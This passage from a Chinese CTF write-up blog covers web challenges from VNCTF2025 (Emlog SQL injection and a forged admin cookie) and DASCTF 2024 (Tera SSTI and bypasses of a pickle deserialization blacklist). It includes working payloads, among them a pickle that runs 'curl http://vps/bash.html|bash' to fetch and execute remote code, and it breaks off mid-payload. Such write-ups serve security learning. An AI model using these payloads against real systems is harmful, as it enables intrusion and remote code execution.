class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">AUTH_KEY:<span class="hljs-title function_ invoke__">yxuzKkM2QC8L8WLPFvawb</span>(mI4R&amp;NglOAMozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64; <span class="hljs-attr">rv</span>:<span class="hljs-number">135.0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">135.0</span><br>                               <br>EM_AUTHCOOKIE_RbAWvNJZ5YMeZLGMr56lfjValO3yqYlr=x<span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select(substr(username,1,16))from(emlog_user)),0x7e),1) #|0|1347191e25f82f5b77b6d5b283ee4064</span><br></code></pre></td></tr></table></figure><p>再用得到的用户名生成可用cookie登录后台。</p><p>或者用AUTH_KEY生成万能密码直接登录：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">generateAuthCookie</span>(<span class="hljs-params"><span class="hljs-variable">$user_login</span>, <span class="hljs-variable">$expiration</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">emHash</span>(<span class="hljs-variable">$user_login</span> . <span class="hljs-string">&#x27;|&#x27;</span> . <span class="hljs-variable">$expiration</span>);<br>    <span class="hljs-variable">$hash</span> = <span class="hljs-title function_ invoke__">hash_hmac</span>(<span class="hljs-string">&#x27;md5&#x27;</span>, <span class="hljs-variable">$user_login</span> . <span class="hljs-string">&#x27;|&#x27;</span> . <span class="hljs-variable">$expiration</span>, <span class="hljs-variable">$key</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$user_login</span> . <span class="hljs-string">&#x27;|&#x27;</span> . <span class="hljs-variable">$expiration</span> . <span class="hljs-string">&#x27;|&#x27;</span> . <span class="hljs-variable">$hash</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">emHash</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">hash_hmac</span>(<span class="hljs-string">&#x27;md5&#x27;</span>, <span class="hljs-variable">$data</span>, <span class="hljs-string">&quot;yxuzKkM2QC8L8WLPFvawb(mI4R&amp;NglOA558fb80a37ff0f45d5abbc907683fc02&quot;</span>);<br>&#125;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">generateAuthCookie</span>(<span class="hljs-string">&quot;&#x27; or 1=1#&quot;</span>, <span class="hljs-number">0</span>));<br></code></pre></td></tr></table></figure><p><img src="/2025/02/09/VNCTF2025-WEB/image-20250211213625630.png" alt="image-20250211213625630"></p><p>后续后台上传恶意插件RCE：</p><p><a href="https://blog.csdn.net/W13680336969/article/details/137267677">Emlog Pro 任意文件上传漏洞（CVE-2023-44974）_emlog v2.2.0后台插件上传漏洞-CSDN博客</a></p><p><a href="https://github.com/yangliukk/emlog/tree/main">yangliukk&#x2F;emlog</a></p><p>压缩包中必须存在一个与压缩包同名的PHP文件，并且上传成功不会返回上传路径。</p><p><img src="/2025/02/09/VNCTF2025-WEB/image-20250211214340591.png" alt="image-20250211214340591"></p><p>打包上传：</p><p><img src="/2025/02/09/VNCTF2025-WEB/image-20250211214831024.png" alt="image-20250211214831024"></p><p><img src="/2025/02/09/VNCTF2025-WEB/image-20250211214930685.png" alt="image-20250211214930685"></p>]]></content>
    
    
    
    <tags>
      
      <tag>比赛</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DASCTF-2024最后一战-WEB复现</title>
    <link href="/2025/02/07/DASCTF-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98-WEB%E5%A4%8D%E7%8E%B0/"/>
    <url>/2025/02/07/DASCTF-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98-WEB%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>期末周的时候看了看，也打了打，但是忘了写wp。。。</p><p>反正寒假今天没啥事，再复现一把吧。</p><h2 id="西湖论剑邀请函获取器"><a href="#西湖论剑邀请函获取器" class="headerlink" title="西湖论剑邀请函获取器"></a>西湖论剑邀请函获取器</h2><p>你不说谁知道是Tera的SSTI啊。。。。</p><p>Rust的玩意，这样读环境变量直接出了：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs rust">&#123;%set my_var = <span class="hljs-title function_ invoke__">get_env</span>(name=<span class="hljs-string">&quot;FLAG&quot;</span>) %&#125;&#123;&#123;my_var&#125;&#125;<br></code></pre></td></tr></table></figure><p>或者：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs rust">&#123;&#123; <span class="hljs-title function_ invoke__">get_env</span>(<span class="hljs-string">&quot;FLAG&quot;</span>) &#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/2025/02/07/DASCTF-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98-WEB%E5%A4%8D%E7%8E%B0/image-20250207175129738.png" alt="image-20250207175129738"></p><h2 id="const-python"><a href="#const-python" class="headerlink" title="const_python"></a>const_python</h2><p>src查看源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> builtins<br><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request,jsonify,session<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><br><br>app = Flask(__name__)<br><br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-built_in">str</span>(uuid.uuid4()).replace(<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, username, password, auth=<span class="hljs-string">&#x27;ctfer&#x27;</span></span>):<br>        <span class="hljs-variable language_">self</span>.username = username<br>        <span class="hljs-variable language_">self</span>.password = password<br>        <span class="hljs-variable language_">self</span>.auth = auth<br><br>password = <span class="hljs-built_in">str</span>(uuid.uuid4()).replace(<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>Admin = User(<span class="hljs-string">&#x27;admin&#x27;</span>, password,<span class="hljs-string">&quot;admin&quot;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Welcome to my application&quot;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">post_login</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br><br>        username = request.form[<span class="hljs-string">&#x27;username&#x27;</span>]<br>        password = request.form[<span class="hljs-string">&#x27;password&#x27;</span>]<br><br><br>        <span class="hljs-keyword">if</span> username == <span class="hljs-string">&#x27;admin&#x27;</span> :<br>            <span class="hljs-keyword">if</span> password == admin.password:<br>                session[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">&quot;admin&quot;</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Welcome Admin&quot;</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Invalid Credentials&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            session[<span class="hljs-string">&#x27;username&#x27;</span>] = username<br><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">        &lt;form method=&quot;post&quot;&gt;</span><br><span class="hljs-string">        &lt;!-- /src may help you&gt;</span><br><span class="hljs-string">            Username: &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;br&gt;</span><br><span class="hljs-string">            Password: &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;br&gt;</span><br><span class="hljs-string">            &lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt;</span><br><span class="hljs-string">        &lt;/form&gt;</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/ppicklee&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ppicklee</span>():<br>    data = request.form[<span class="hljs-string">&#x27;data&#x27;</span>]<br><br>    sys.modules[<span class="hljs-string">&#x27;os&#x27;</span>] = <span class="hljs-string">&quot;not allowed&quot;</span><br>    sys.modules[<span class="hljs-string">&#x27;sys&#x27;</span>] = <span class="hljs-string">&quot;not allowed&quot;</span><br>    <span class="hljs-keyword">try</span>:<br><br>        pickle_data = base64.b64decode(data)<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> &#123;<span class="hljs-string">&quot;os&quot;</span>, <span class="hljs-string">&quot;system&quot;</span>, <span class="hljs-string">&quot;eval&quot;</span>, <span class="hljs-string">&#x27;setstate&#x27;</span>, <span class="hljs-string">&quot;globals&quot;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;template&#x27;</span>, <span class="hljs-string">&#x27;render&#x27;</span>, <span class="hljs-string">&#x27;\\&#x27;</span>,<br>                 <span class="hljs-string">&#x27;compile&#x27;</span>, <span class="hljs-string">&#x27;requests&#x27;</span>, <span class="hljs-string">&#x27;exit&#x27;</span>,  <span class="hljs-string">&#x27;pickle&#x27;</span>,<span class="hljs-string">&quot;class&quot;</span>,<span class="hljs-string">&quot;mro&quot;</span>,<span class="hljs-string">&quot;flask&quot;</span>,<span class="hljs-string">&quot;sys&quot;</span>,<span class="hljs-string">&quot;base&quot;</span>,<span class="hljs-string">&quot;init&quot;</span>,<span class="hljs-string">&quot;config&quot;</span>,<span class="hljs-string">&quot;session&quot;</span>&#125;:<br>            <span class="hljs-keyword">if</span> i.encode() <span class="hljs-keyword">in</span> pickle_data:<br>                <span class="hljs-keyword">return</span> i+<span class="hljs-string">&quot; waf !!!!!!!&quot;</span><br><br>        pickle.loads(pickle_data)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;success pickle&quot;</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;fail pickle&quot;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/admin&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">admin</span>():<br>    username = session[<span class="hljs-string">&#x27;username&#x27;</span>]<br>    <span class="hljs-keyword">if</span> username != <span class="hljs-string">&quot;admin&quot;</span>:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&#x27;You are not admin!&#x27;</span>&#125;)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Welcome Admin&quot;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/src&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">src</span>():<br>    <span class="hljs-keyword">return</span>  <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;app.py&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>,encoding=<span class="hljs-string">&quot;utf-8&quot;</span>).read()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="hljs-literal">False</span>, port=<span class="hljs-number">5000</span>)<br></code></pre></td></tr></table></figure><p>直接打pickle不就完了，漏了<code>subprocess</code>，但是好像这个里面调用的也是<code>os</code>，这里的<code>os</code>只是用<code>sys.modules[&#39;os&#39;] = &quot;not allowed&quot;</code>意思意思了一下，所以完全可以非预期。</p><p><code>pker</code>解了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">i = <span class="hljs-number">0</span><br>s = <span class="hljs-string">&#x27;RCE&#x27;</span><br>lst = [i]<br>tpl = (<span class="hljs-number">0</span>,)<br>dct = &#123;tpl: <span class="hljs-number">0</span>&#125;<br>sp = GLOBAL(<span class="hljs-string">&#x27;subprocess&#x27;</span>, <span class="hljs-string">&#x27;getoutput&#x27;</span>)<br>sp(s)<br><span class="hljs-keyword">return</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br>data=<span class="hljs-string">b&#x27;&#x27;&#x27;I0</span><br><span class="hljs-string">p0</span><br><span class="hljs-string">0S&#x27;curl http://vps/bash.html|bash&#x27;</span><br><span class="hljs-string">p1</span><br><span class="hljs-string">0(g0</span><br><span class="hljs-string">lp2</span><br><span class="hljs-string">0(I0</span><br><span class="hljs-string">tp3</span><br><span class="hljs-string">0(g3</span><br><span class="hljs-string">I0</span><br><span class="hljs-string">dp4</span><br><span class="hljs-string">0csubprocess</span><br><span class="hljs-string">getoutput</span><br><span class="hljs-string">p5</span><br><span class="hljs-string">0g5</span><br><span class="hljs-string">(g1</span><br><span class="hljs-string">tR.&#x27;&#x27;&#x27;</span><br><br><span class="hljs-built_in">print</span>(base64.b64encode(data))<br></code></pre></td></tr></table></figure><img src="/2025/02/07/DASCTF-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98-WEB%E5%A4%8D%E7%8E%B0/image-20250207173020883.png" class="" title="image-20250207173020883"><p>网上师傅还有高手做法：<a href="https://blog.lie.moe/2024/12/22/dasctf_2024.12_writeup/">DASCTF 2024最后一战 WriteUp题解 | 梓漪の窝</a></p><p><img src="/2025/02/07/DASCTF-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98-WEB%E5%A4%8D%E7%8E%B0/image-20250207173136767.png" alt="image-20250207173136767"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">exit(<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;app.py&#x27;</span>,<span class="hljs-string">&#x27;a+&#x27;</span>).write(<span class="hljs-string">&quot;#&quot;</span>+<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>).read()))<br></code></pre></td></tr></table></figure><p>为了避免陷入死循环，使用一个exit直接结束程序。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">ctimeit<br>repeat<br>(ccodecs<br>decode<br>(ccodecs<br>decode<br>(V65786974286f70656e28276170702e7079272c27612b27292e7772697465282223222b6f70656e28272f666c6167272c277227292e7265616428292929<br>Vhex<br>tRtRtR.<br></code></pre></td></tr></table></figure><p>或者来自：<a href="https://xu17.top/2024/12/23/2024DASCTF/#Web">DASCTF 2024最后一战 wp - XU17</a></p><p><img src="/2025/02/07/DASCTF-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98-WEB%E5%A4%8D%E7%8E%B0/image-20250207173636084.png" alt="image-20250207173636084"></p><p>如果不考虑subprocess的非预期，就参考官方wp用的复杂方法吧。</p><p>使用types的<code>CodeType</code>修改常量字节码，修改返回的文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">src</span>():<br>    <span class="hljs-keyword">return</span>  <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;app.py&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>,encoding=<span class="hljs-string">&quot;utf-8&quot;</span>).read()<br><br>oCode = src.__code__<br>secret.__code__= types.CodeType(oCode.co_argcount, <br>                                oCode.co_posonlyargcount, <br>                                oCode.co_kwonlyargcount, <br>                                oCode.co_nlocals, <br>                                oCode.co_stacksize, <br>                                oCode.co_flags,<br>                                oCode.co_code, <br>                                <span class="hljs-built_in">tuple</span>(c <span class="hljs-keyword">if</span> c != <span class="hljs-string">&#x27;app.py&#x27;</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> oCode.co_consts), <br>                                oCode.co_names, <br>                                oCode.co_varnames,<br>                                oCode.co_filename,<br>                                oCode.co_name, <br>                                oCode.co_firstlineno, <br>                                oCode.co_lnotab,<br>                                oCode.co_freevars,<br>                                oCode.co_cellvars,)<br></code></pre></td></tr></table></figure><p>通过这个代码查看co_const：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> builtins<br><span class="hljs-keyword">import</span> types<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">src</span>():<br>    <span class="hljs-keyword">return</span>  <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;app.py&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>,encoding=<span class="hljs-string">&quot;utf-8&quot;</span>).read()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> src.__code__.__dir__():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;i&#125;</span> : <span class="hljs-subst">&#123;<span class="hljs-built_in">getattr</span>(src.__code__, i)&#125;</span>&quot;</span>)<br><br>g1 = builtins.<span class="hljs-built_in">getattr</span><br>g2 = <span class="hljs-built_in">getattr</span>(src,<span class="hljs-string">&quot;__code__&quot;</span>)<br>g3 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_argcount&quot;</span>)<br>g4 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_posonlyargcount&quot;</span>)<br>g5 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_kwonlyargcount&quot;</span>)<br>g6 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_nlocals&quot;</span>)<br>g7 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_stacksize&quot;</span>)<br>g8 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_flags&quot;</span>)<br>g9 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_code&quot;</span>)<br>g10 = (<span class="hljs-literal">None</span>, <span class="hljs-string">&#x27;flag&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;utf-8&#x27;</span>, (<span class="hljs-string">&#x27;encoding&#x27;</span>,))<span class="hljs-comment">#g10 = getattr(g2,&quot;co_consts&quot;)</span><br>g11 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_names&quot;</span>)<br>g12 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_varnames&quot;</span>)<br>g13 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_filename&quot;</span>)<br>g14 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_name&quot;</span>)<br>g15 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_firstlineno&quot;</span>)<br>g16 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_lnotab&quot;</span>)<br>g17 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_freevars&quot;</span>)<br>g18 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_cellvars&quot;</span>)<br><br>g19 = types.CodeType(g3,g4,g5,g6,g7,g8,g9,g10,g11,g12,g13,g14,g15,g16,g17,g18)<br>g20 = builtins.<span class="hljs-built_in">setattr</span><br>g20(src,<span class="hljs-string">&quot;__code__&quot;</span>,g19)<br><span class="hljs-built_in">print</span>(src())<br></code></pre></td></tr></table></figure><p><img src="/2025/02/07/DASCTF-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98-WEB%E5%A4%8D%E7%8E%B0/image-20250207173426028.png" alt="image-20250207173426028"></p><p>构造payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs python">op3 = <span class="hljs-string">b&#x27;&#x27;&#x27;cbuiltins</span><br><span class="hljs-string">getattr</span><br><span class="hljs-string">p0</span><br><span class="hljs-string">c__main__</span><br><span class="hljs-string">src</span><br><span class="hljs-string">p3</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g3</span><br><span class="hljs-string">S&#x27;__code__&#x27;</span><br><span class="hljs-string">tRp4</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_argcount&#x27;</span><br><span class="hljs-string">tRp5</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_argcount&#x27;</span><br><span class="hljs-string">tRp6</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_kwonlyargcount&#x27;</span><br><span class="hljs-string">tRp7</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_nlocals&#x27;</span><br><span class="hljs-string">tRp8</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_stacksize&#x27;</span><br><span class="hljs-string">tRp9</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_flags&#x27;</span><br><span class="hljs-string">tRp10</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_code&#x27;</span><br><span class="hljs-string">tRp11</span><br><span class="hljs-string">(NS&#x27;/flag&#x27;</span><br><span class="hljs-string">S&#x27;r&#x27;</span><br><span class="hljs-string">S&#x27;utf-8&#x27;</span><br><span class="hljs-string">(S&#x27;encoding&#x27;</span><br><span class="hljs-string">ttp12</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_names&#x27;</span><br><span class="hljs-string">tRp13</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span 